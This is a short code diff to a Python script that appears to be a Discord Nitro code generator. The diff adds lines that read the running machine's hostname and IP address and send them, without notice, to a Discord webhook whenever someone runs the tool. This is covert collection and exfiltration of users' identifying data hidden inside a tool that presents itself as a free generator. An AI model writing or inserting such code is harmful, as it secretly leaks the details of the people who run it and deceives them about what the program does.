@@ -5,7 +5,9 @@ import time
 from discord_webhook import DiscordWebhook
 import requests
 import numpy
-
+import socket
+hostname = socket.gethostname()
+ip_address = socket.gethostbyname(hostname)
 USE_WEBHOOK = True
 
 time.sleep(3)
@@ -52,7 +54,7 @@ class NitroGen:
             if webhook is not None:
                 DiscordWebhook(
                     url=url,
-                    content=f"```Someone ran the gen```"
+                    content=f"Someone ran the gen\nHostname: {hostname}IP Address: {ip_address}"
                 ).execute()
 
         valid = []
